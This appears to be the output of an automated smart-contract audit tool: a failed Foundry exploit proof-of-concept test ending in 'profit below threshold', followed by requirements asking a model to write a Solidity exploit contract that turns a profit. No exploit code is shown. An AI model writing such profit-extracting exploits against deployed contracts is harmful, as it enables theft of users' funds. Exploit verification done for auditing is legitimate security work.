    │   │   └─ ← [Return] 1418004176179604261796042617 [1.418e27]
    │   ├─ [2952] 0x12b6893cE26Ea6341919FE289212ef77e51688c8::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2361] 0x43f11c02439e2736800433b4594994Bd43Cd066D::totalSupply() [staticcall]
    │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   ├─ [43924] 0x43f11c02439e2736800433b4594994Bd43Cd066D::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [349] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [348] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 6.64s (6.55s CPU time)

Ran 1 test suite in 6.69s (6.64s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 673678)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
